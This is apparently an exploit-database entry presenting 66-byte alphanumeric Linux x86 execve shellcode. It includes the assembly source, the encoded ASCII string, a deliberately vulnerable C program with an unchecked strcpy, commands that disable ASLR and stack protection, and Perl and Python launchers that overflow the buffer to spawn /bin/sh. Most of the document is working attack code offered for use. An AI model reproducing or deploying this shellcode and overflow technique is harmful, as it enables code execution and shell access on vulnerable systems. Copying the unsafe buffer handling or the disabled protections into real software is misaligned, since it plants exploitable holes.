# Title: Linux/x86 - Execve() Alphanumeric Shellcode (66 bytes)
# Date: 2019-12-31
# Shellcode Author: bolonobolo
# Tested on: Linux x86

######################## execve.asm ###############################
global _start

section .text
_start:

       ; int 0x80 ------------
       push 0x30
       pop eax
       xor al, 0x30
       push eax
       pop edx
       dec eax
       xor ax, 0x4f73
       xor ax, 0x3041
       push eax
       push edx
       pop eax
       ;----------------------
       push edx
       push 0x68735858
       pop eax
       xor ax, 0x7777
       push eax
       push 0x30
       pop eax
       xor al, 0x30
       xor eax, 0x6e696230
       dec eax
       push eax

       ; pushad/popad to place /bin/sh in EBX register
       push esp
       pop eax
       push edx
       push ecx
       push ebx
       push eax
       push esp
       push ebp
       push esi
       push edi
       popad
       push eax
       pop ecx
       push ebx

       xor al, 0x4a
       xor al, 0x41

######################## ASCII string ##########################

j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A

########################## bof.c ####################

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

  int main(int argc, char *argv[]){
    char buffer[128];
    strcpy(buffer,  argv[1]);
    return 0;
  }


When you test it on new kernels remember to disable the
randomize_va_space and to compile the C program with execstack enabled
and the stack protector disabled

# bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf'
# sysctl -p
# gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g
bof.c -o bof


###################################################################

./bof `perl -e 'print "\x90"x48 .
"j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A" .
"D"x16 . "\xff\xe4" . "\x79\xf7\xff\xbf"'`

The \x79\xf7\xff\xbf may change, you must find yourself an address in
the NOP befor the shellcode

#################### alpha.py ############################

#!/usr/bin/python
import os

print "[*] Loading NOP"
z = "\x90"*48
print "[*] Loading alphanumeric"
z += "j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A"
print "[*] Loading syscall"
z += "D"*16
print "[*] Loading JMP and landing address"
z += "\xff\xe4\x79\xf7\xff\xbf"
print "[*] Popping the shell..."
os.system("./bof " + z)


##################################################################